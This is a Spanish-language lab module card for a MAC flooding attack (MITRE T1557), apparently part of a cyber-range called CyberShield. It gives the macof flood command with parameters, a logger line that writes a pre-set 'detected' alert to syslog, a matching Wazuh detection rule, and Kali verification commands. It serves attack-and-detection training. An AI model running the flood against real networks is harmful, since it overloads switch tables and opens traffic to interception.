# MOD01 — MAC Flooding
ID: LAN-001 | MITRE: T1557 | Wazuh Rule: 100500 | Risk: HIGH

## Comando (INMUTABLE)
sudo macof -i {{interface}} -n {{count}}
Alternativa con destino: sudo macof -i {{interface}} -d {{target_ip}}

## Parámetros
| name       | type   | default | required |
|------------|--------|---------|----------|
| interface  | text   | eth0    | true     |
| count      | number | 5000    | true     |
| target_ip  | text   | ""      | false    |

## Logger (INMUTABLE)
logger -t CyberShield -p local0.alert "SEC_VIOLATION: MAC Flooding detected on Port 1 - Interface {{interface}} - {{count}} packets sent - CAM Table Overflow confirmed - MITRE:T1557"

## Regla Wazuh (INMUTABLE)
<rule id="100500" level="12">
  <if_sid>1002</if_sid>
  <match>SEC_VIOLATION: MAC Flooding</match>
  <description>ALERTA CYBERSHIELD: Ataque MAC Flooding detectado</description>
  <mitre><id>T1557</id></mitre>
</rule>

## Nota crítica
tun0 filtra Capa 2. Usar siempre eth0 (bridge Proxmox).

## Verificación en Kali (ejecutar en paralelo al ataque)
```bash
watch -n1 "sudo arp -n | wc -l"
tcpdump -i eth0 -nn 'ether[0] & 1 = 0' 2>/dev/null | head -20
```